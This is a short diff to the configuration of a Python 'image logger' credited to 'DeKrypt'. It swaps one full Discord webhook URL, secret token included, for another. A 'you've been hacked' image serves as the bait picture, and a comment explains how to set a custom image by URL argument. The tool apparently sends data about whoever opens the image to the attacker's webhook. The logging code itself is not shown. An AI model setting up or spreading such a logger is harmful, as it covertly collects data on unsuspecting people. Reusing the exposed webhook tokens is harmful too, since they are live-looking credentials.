@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1482034579543163054/Ks2zIflkZAxNg4GGu2nrN3XGu9UVS3tIMCcJxtCSypaFBDZdEdK1-32gqmHL5wktrf-w",
+    "webhook": "https://discord.com/api/webhooks/1482101305416749158/5Aqjma6whZXGrurqKnOzPFsOqfdT6WhkQy9mVU7uJRNmgr9m9QcdPZf0AcFHKriydgVv",
     "image": "https://www.assetbail.com/wp-content/uploads/2018/01/youve-been-hacked.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
